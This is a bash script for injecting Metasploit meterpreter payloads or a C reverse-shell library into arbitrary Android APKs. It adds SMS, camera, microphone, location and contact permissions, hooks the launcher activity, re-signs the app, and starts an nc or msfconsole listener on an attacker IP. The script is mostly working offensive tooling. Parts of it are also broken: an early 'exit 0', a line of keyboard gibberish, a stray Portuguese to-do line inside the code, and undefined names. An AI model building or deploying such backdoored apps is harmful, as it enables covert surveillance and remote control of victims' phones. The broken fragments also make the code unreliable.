#!/bin/bash

###########################################
#  This script is a script for injecting  #
#  metasploit payloads on arbitrary APKs. # 
###########################################

# Colours
red="\e[31m"
green="\e[32m"
yellow="\e[33m"
reset="\e[0m"

banner(){
echo "
          _,-'              _           _     _
            \\\\ _,          | |_ ___ ___| |_ _| |___ ___ ___
           _,-' \\          | . | .'|  _| '_| . | . | . |  _|
            \\    \\         |___|__,|___|_,_|___|___|___|_|
             \\_,-'\\                   _       _         _   _
              \\_,-'                  |_|___  |_|___ ___| |_|_|___ ___
                 \\\\    ▀▄   ▄▀       | |   | | | -_|  _|  _| | . |   |
                  \|  ▄█▀███▀█▄      |_|_|_|_| |___|___|_| |_|___|_|_|
                   . █▀███████▀█           |___|
                   . █ █▀▀▀▀▀█ █
                   .    ▀▀ ▀▀
"
}

banner

usage(){
    echo -e "Usage: ${yellow}$0${reset} ${green}-at /path/to/apktool.jar -ao ~/path/to/file.apk -li <ATTACKER-IP> -lp <ATTACKER-PORT>${reset}"
    echo -e "\nOptions: "
    echo -e "\t -ao|--apk-original"
    echo -e "\t -at|--apktool"
    echo -e "\t -l |--lib"
    echo -e "\t -dw|--directory-work"
    echo -e "\t -li|--local-ip"
    echo -e "\t -lp|--local-port"
    echo -e "\t -m |--metasploit"
    echo ""
    exit 1
}

if [[ $# -lt 8 ]] || [[ "$#" -gt 10 ]]; then
    echo -e "\nYou need to specify a valid number of parameters and arguments!\n"
    usage
fi

echo -n "Verifying the essential commands to use with this script... "
apkinfo_cmd="$(find / -name apkinfo -type f -executable -print 2> /dev/null | head -n1)"
[[ -z "${apkinfo_cmd}" ]] && echo -e "Fail!\nIt looks like the ${red}apkinfo doesn't exist${reset} in the system." && exit 1

apksigner_cmd="$(find / -name apksigner -type f -executable -print 2> /dev/null)"
[[ -z "${apksigner_cmd}" ]] && echo -e "Fail!\nIt looks like the ${red}apksigner doesn't exist${reset} in the system." && exit 1

java_cmd="$(command -v java)"
[[ -z "${java_cmd}" ]] && echo -e "Fail!\nIt looks like the ${red}java doesn't exist${reset} in the system." && exit 1

keytool_cmd="$(command -v keytool)"
[[ -z "${keytool_cmd}" ]] && echo -e "Fail!\nIt looks like the ${red}keytool doesn't exist${reset} in the system." && exit 1

msfconsole_cmd="$(command -v msfconsole)"
[[ -z "${msfconsole_cmd}" ]] && echo -e "Fail\nIt looks like the ${red}msfconsole doesn't exist${reset} in the system." && exit 1

msfvenom_cmd="$(command -v msfvenom)"
[[ -z "${msfvenom_cmd}" ]] && echo -e "Fail\nIt looks like the ${red}msfvenom doesn't exist${reset} in the system." && exit 1

msfdb_cmd="$(command -v msfdb)"
[[ -z "${msfdb_cmd}" ]] && echo -e "Fail!\nIt looks like the ${red}msfdb doesn't exist${reset} in the system." && exit 1

zipalign_cmd="$(find / -name zipalign -type f -executable -print 2> /dev/null)"
[[ -z "${zipalign_cmd}" ]] && echo -e "Fail!\nIt looks like the ${red}zipalign doesn't exist${reset} in the system." && exit 1

echo "Done!"

options=(-ao --apk-original -at --apktool -dw --directory-work -l --lib -li --local-ip -lp --local-port -m --metasploit)

check_argument(){
    if [[ "${options[@]}" =~ "$2" ]]; then
        echo -e "The argument of ${yellow}\"$1\"${reset} it can not be ${red}\"$2\"${reset}, please, ${yellow}specify a valid one${reset}.\n"
        usage
    fi
}

while [ $# -ne 0 ]; do
    case $1 in
        -ao|--apk-original)
            check_argument $1 $2
            if [[ $(file $2 | grep -q "Zip archive data") ]] && \
                [[ $(${apkinfo_cmd} $2 | grep -qE "^APK|^App.name|^Package|^Version") ]]; then
                    apk_backdoor_injection_log=/tmp/"$(${apkinfo_cmd} $2 | grep "^Package:" | awk '{print $2}')"_backdoor_injection.log
                    apk_original="$2"
                    apk_injected="$(basename "${apk_original}" .apk)-injected"
            else
                echo -e "You need to specify a valid apk file.\n"
                usage
            fi
            shift 2
            ;;
        -at|--apktool)
            check_argument $1 $2
            if [[ -f $2 ]] && [[ $(file $2 | grep -q "Zip archive data") ]] && \
                [[ $("${java_cmd}" -jar $2 --version > /dev/null 2>&1 ; echo $?) -eq 0 ]] ; then
                apktool_jar="$2"
            else
                echo -e "\nYou haven't the apktool.jar!"
                echo -e "Please, inform the correct full path to apktool.\n"
                usage
            fi
            shift 2
            ;;
        -dw|--directory-work)
            check_argument $1 $2
            if [ ! -d $2 ]; then
                if [[ ! $(mkdir -p $2) ]] || [[ ! $(touch $2/permission.txt) ]]; then
                    echo -e "You need to specify a valid directory or directory with write permission!"
                    usage
                fi
            else
                dir_to_work="$2"
            fi
            shift 2
            ;;
        -l|--lib)
            [[ "${metasploit_injection}" == "yes" ]] && \
                echo "You can not use lib injection at the same time metasploit injection!" && usage
            lib_injection=yes
            shift
            ;;
        -li|--local-ip)
            check_argument $1 $2
            IPv4_regex='((25[0-5]|2[0-4][0-9]|[01][0-9][0-9]|[0-9]{1,2})[.]){3}(25[0-5]|2[0-4][0-9]|[01][0-9][0-9]|[0-9]{1,2})'
            [[ "${IPv4_regex}" =~ $2 ]] && attacker_ip=$2 || echo -e "You need to inform a valid IP!\n" && usage
            shift 2
            ;;
        -lp|--local-port)
            check_argument $1 $2
            [[ '[0-9]*' =~ $2 ]] && attacker_port=$2 || echo -e "You need to inform a valid port!\n" && usage
            shift 2
            ;;
        -m|--metasploit)
            [[ "${lib_injection}" == "yes" ]] && \
                echo "You can not use metasploit injection at the same time lib injection!" && usage
            apk_meterpreter="backdoor.apk"
            metasploit_injection=yes
            msfvenom_payload="android/meterpreter/reverse_tcp"
            shift
            ;;
        -?*)
            usage
            ;;
        *)
            break
    esac
done

echo -n "Cleaning before the execution... "
[[ -s "${dir_to_work}/${apk_meterpreter}" ]] && rm -rf "${dir_to_work}/${apk_meterpreter}"
[[ -s "${dir_to_work}/${apk_meterpreter%.apk}" ]] && rm -rf "${dir_to_work}/${apk_meterpreter%.apk}"
[[ -s "${dir_to_work}/${apk_injected}" ]] && rm -rf "${dir_to_work}/${apk_injected}"
echo "Done!"

exit 0

preparation(){

    echo -n "Decompiling the ${apk_original}... "
    "${java_bin}" -jar "${apktool_jar}" d "${apk_original}" -f -o "${dir_to_work}/${apk_injected}" > "${apk_backdoor_injection_log}" 2>&1
    if [ ! -z "$(ls -A -- "${dir_to_work}/${apk_injected}")" ]; then
        echo "Done!"
    else
        echo "Fail!"
        echo "The process of decompiling ${apk_original} failed!"
        cat "${apk_backdoor_injection_log}"
        exit 1
    fi

    echo -n "Injecting the permissions in the AndroidManifest.xml file... "
    cp "${dir_to_work}/${apk_injected}/AndroidManifest.xml" "${dir_to_work}/${apk_injected}/AndroidManifest.xml.0"
    [[ ! $(grep -q android.permission.SET_WALLPAPER "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.SET_WALLPAPER\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.INTERNET "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.INTERNET\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.ACCESS_WIFI_STATE "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.CHANGE_WIFI_STATE "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.CHANGE_WIFI_STATE\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.ACCESS_NETWORK_STATE "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/>"\
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.ACCESS_COARSE_LOCATION "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[  ! $(grep -q android.permission.ACCESS_FINE_LOCATION "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.READ_PHONE_STATE "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.READ_PHONE_STATE\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.READ_SMS "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.READ_SMS\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.SEND_SMS "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.SEND_SMS\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.RECEIVE_SMS "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.RECEIVE_SMS\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.RECORD_AUDIO "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.RECORD_AUDIO\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.CALL_PHONE "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.CALL_PHONE\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.READ_CONTACTS "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.READ_CONTACTS\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.WRITE_CONTACTS "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WRITE_CONTACTS\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.WRITE_SETTINGS "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WRITE_SETTINGS\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.CAMERA "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.CAMERA\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.WRITE_EXTERNAL_STORAGE "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.RECEIVE_BOOT_COMPLETED "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.READ_CALL_LOG "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.READ_CALL_LOG\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.WRITE_CALL_LOG "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WRITE_CALL_LOG\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q android.permission.WAKE_LOCK "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WAKE_LOCK\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q \"android.hardware.camera\" "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\"android.hardware.camera\"/>"\
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q \"android.hardware.camera.autofocus\" "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\"android.hardware.camera.autofocus\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    [[ ! $(grep -q \"android.hardware.microphone\" "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
        sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\"android.hardware.microphone\"/>" \
        "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
    echo "Done!"
    
    echo -n "Looking for the correct smali file with appropriate activity... "
    file_to_inject=$(find "${dir_to_work}/${apk_injected}" -type f | grep -E "$(grep -B2 -e android.intent.action.MAIN -e android.intent.category.LAUNCHER "${dir_to_work}/${apk_injected}/AndroidManifest.xml" | grep activity | head -n1 | sed -e 's/[[:space:]].*android:name=//' -e 's/[[:space:]].*//' -e 's/"//g' -e 's/\./\//g').smali$")
    echo -e "Done!\nFile to inject: ${file_to_inject}"
}

lib_injection(){

echo -n "Creating the lib to injection... "
cat >> "${dir_work}/lib_injection.cpp" <<EOF    
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h> // htons
#include <netinet/in.h>
#include <sys/types.h>

#define REMOTE_HOST "${attacker_ip}"
#define REMOTE_PORT ${attacker_port}

void __attribute__ ((constructor)) reverse()
{
    int s;
    struct sockaddr_in sa;
    if(fork() == 0){
        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(REMOTE_HOST);
        sa.sin_port = htons(REMOTE_PORT);
        s = socket(AF_INET, SOCK_STREAM, 0);
        connect(s, (struct sockaddr *)&sa, sizeof(sa));
        dup2(s, 0); // stdin
        dup2(s, 1); // stdout
        dup2(s, 2); // stderr
        execve("/system/bin/sh", 0, 0);
    }
}
EOF
echo "Done!"

    if [[ -s "${dir_work}/lib_injection.c" ]]; then
        asdfasdfasdfasdfas
    fi

    cp lib*.so "${dir_to_work}/${apk_injected}/lib/"
    tenho que verificar quais diretórios preciso usar.

    echo -n "Injecting the hook into the appropriate activity of the original apk... "
    sed -i "/invoke-super.{p0,.p1},.*;->onCreate(Landroid\/os\/Bundle;)V/ a \    \n# IBLISS" "${file_to_inject}"
    sed -i "/#IBLISS/ a \    const/4 v0, 0x1" "${file_to_inject}"
    sed -i "/const/4.v0,.0x1/ a \    const-string v1, \"Android Backdoor Injection by IBLISS - Digital Security\"" "${file_to_inject}"
    sed -i "/const-string.v1,.\"Android.Backdoor.Injection.by.IBLISS.-.Digital.Security\"/ a \    invoke-static {p0, v1, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;" "${file_to_inject}"
    sed -i "/invoke-static.{p0,.v1,.v0},.Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast/ a \    move-result-object v0" "${file_to_inject}"
    sed -i "/move-result-object.v0/ a \    invoke-virtual {v0}, Landroid/widget/Toast;->show()V" "${file_to_inject}"
    sed -i "/invoke-virtual.{v0},.Landroid/widget/Toast;->show()V/ a \    \n# Reverse Shell" "${file_to_inject}"
    sed -i "/#.Reverse.Shell/ a \    const-string v0, ${lib_injected_name}" "${file_to_inject}"
    sed -i "/const-string v0, ${lib_injected_name}/ a \    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V" "${file_to_inject}"
    echo "Done!"

}

metasploit_injection(){
    echo -n "Verifying the Mestaploit environment... "
    if [[ $(netstat -nltp 2> /dev/null | grep -q "127.0.0.1:5432") ]]; then
        echo "Done!"
        echo -n "Verifying the Metasploit Web Service... "
        if [[ -z $("${msfdb_cmd}" --component webservice status 2> /dev/null | grep "is already running as PID" | awk '{print $8}') ]]; then
            if [ -s ${HOME}/.msf4/msf-ws-key.pem ]; then
                "${msfdb_cmd}" --component webservice start > ${HOME}/.msf4/logs/injection_initialization.log 2>&1
            else
                "${msfdb_cmd}" init --component webservice --use-defaults > ${HOME}/.msf4/logs/injection_initialization.log 2>&1
                echo "Done!"
            fi
        fi
    else
        echo "Fail!"
        echo "Please start the postgresql!"
        exit 1
    fi

    echo -n "Build an infected apk... "

    "${msfvenom_cmd}" -p "${msfvenom_payload}" LHOST="${attacker_ip}" LPORT="${attacker_port}" \
        -o "${dir_to_work}/${apk_meterpreter}" > "${apk_backdoor_injection_log}" 2>&1

    if [ -s "${dir_to_work}/${apk_meterpreter}" ]; then
        echo "Done!"
        echo -n "Decompiling the ${apk_meterpreter}... "
        
        "${java_bin}" -jar "${apktool_jar}" d "${dir_to_work}/${apk_meterpreter}" \
            -f -o "${dir_to_work}/${apk_meterpreter%.apk}" > "${apk_backdoor_injection_log}" 2>&1

        if [ ! -z "$(ls -A -- "${dir_to_work}/${apk_meterpreter%.apk}")" ]; then
            echo "Done!"
        else
            echo "Fail!"
            echo "The process of decompiling ${apk_meterpreter} failed!"
            cat "${apk_backdoor_injection_log}"
            exit 1
        fi
    else
        echo "Fail!"
        echo -e "\nThe infected apk ("${dir_to_work}/${apk_meterpreter}") does not exist!"
        cat "${apk_backdoor_injection_log}"
        exit 1
    fi

    echo -n "Copying the backdoor to original apk... "
    [[ -d "${dir_to_work}/${apk_meterpreter%.apk}/smali/com/metasploit/stage" && -d "${dir_to_work}/${apk_injected}/smali/com" ]] && \
        mkdir -p "${dir_to_work}/${apk_injected}/smali/com/metasploit/stage" && \
        cp -ar "${dir_to_work}/${apk_meterpreter%.apk}/smali/com/metasploit/stage/Payload.smali" \
        "${dir_to_work}/${apk_injected}/smali/com/metasploit/stage/"
    echo "Done!"

    echo -n "Injecting the hook into the appropriate activity of the original apk... "
    sed -i "/invoke-super.{p0,.p1},.*;->onCreate(Landroid\/os\/Bundle;)V/ a \    invoke-static {p0}, Lcom\/metasploit\/stage\/Payload;->start(Landroid\/content\/Context;)V" "${file_to_inject}"
    echo "Done!"
}

repacking_apk(){
    if [[ -n $(grep metasploit "${file_to_inject}") ]]; then
        echo -n "Packing the injected apk with a backdoor ${dir_to_work}/${apk_injected}... "

        "${java_bin}" -jar "${apktool_jar}" b -f -d "${dir_to_work}/${apk_injected}" \
            -o "${dir_to_work}/${apk_injected}.apk" >> "${apk_backdoor_injection_log}" 2>&1

        if [ -s "${dir_to_work}/${apk_injected}.apk" ]; then
            echo "Done!"
        else
            echo "Failed!"
            cat "${apk_backdoor_injection_log}"
            exit 1
        fi
    fi

    "${keytool_cmd}" -genkey -v -keystore android-pentest.keystore -alias android-pentest -keyalg RSA -keysize 2048 -validity 10000
    "${zipalign_cmd}" -p 4 "${dir_to_work}/${apk_injected}.apk" "${dir_to_work}/${apk_injected}-aligned.apk"
    "${zipalign_cmd}" -c 4 "${dir_to_work}/${apk_injected}-aligned.apk"

    # Old method
    #jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name
    #jarsigner -verify -verbose my_application.apk

    # New method
    "${apksigner_cmd}" sign --ks-key-alias android-pentest --ks android-pentest.keystore "${dir_to_work}/${apk_injected}-aligned.apk"
    "${apksigner_cmd}" verify "${dir_to_work}/${apk_injected}-aligned.apk"
}

open_reverse_shel(){
    if [ "${lib_injection}" == "yes" ]; then
        nc -lvnp "${attacker_port}"
    fi

    if [ "${metasploit_injection}" == "yes" ]; then
        echo "Open the metasploit..."
        echo "use exploit/multi/handler" >> "${dir_to_work}/meterpreter_apk_backdoor.rc"
        echo "set PAYLOAD android/meterpreter/reverse_tcp" >> "${dir_to_work}/meterpreter_apk_backdoor.rc"
        echo "set LHOST ${attacker_ip}" >> "${dir_to_work}/meterpreter_apk_backdoor.rc"
        echo "set LPORT ${attacker_port}" >> "${dir_to_work}/meterpreter_apk_backdoor.rc"
        echo "exploit -j -z" >> "${dir_to_work}/meterpreter_apk_backdoor.rc"
        "${msfconsole_cmd}" -r "${dir_to_work}/meterpreter_apk_backdoor.rc"
    fi
}

preparation
[[ "${lib_injection}" == "yes" ]] && lib_injection
[[ "${metasploit_injection}" == "yes" ]] && metasploit_injection
repacking_apk
install_apk

echo -e "${red}Warning:${reset}"
echo -e "\tCaso a reverse shell não funcione, e acabe crashando o app, você precisa verificar através do logcat quais activity são chamadas, caso a activity utilizada anteriormente seja chamada, ignore e utilize outro.

use grep START u0 com o logcat para idenfificar quais activities possam ser usadas.

Isso provavelmente acontece pela verificação de permissão de acesso a recursos do sistema, como cameras, fotos, etc..."

open_reverse_shell

